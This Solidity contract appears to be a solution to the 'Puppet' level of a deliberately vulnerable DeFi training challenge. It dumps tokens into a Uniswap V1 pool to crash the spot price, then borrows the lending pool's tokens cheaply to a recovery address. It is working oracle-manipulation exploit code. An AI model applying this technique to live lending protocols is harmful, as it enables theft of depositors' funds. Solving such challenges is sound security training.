// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";

contract PuppetExploit {
    DamnValuableToken token;
    IUniswapV1Exchange exchange;
    PuppetPool pool;
    address recovery;

    constructor(DamnValuableToken _token, IUniswapV1Exchange _exchange, PuppetPool _pool, address _recovery) payable{
        token = _token;
        exchange = _exchange;
        pool = _pool;
        recovery = _recovery;
    }

    function attack(uint256 exploitAmount) public{
        //Idea dump tokens to drop the price in the LP, and we can get all of them for a small amount of ETH.
        uint256 tokenBalance = token.balanceOf(address(this));
        token.approve(address(exchange), tokenBalance);
        exchange.tokenToEthTransferInput(tokenBalance, 9, block.timestamp, address(this));
        pool.borrow{value: address(this).balance}(exploitAmount, recovery);
    }

    receive() external payable {
    }
}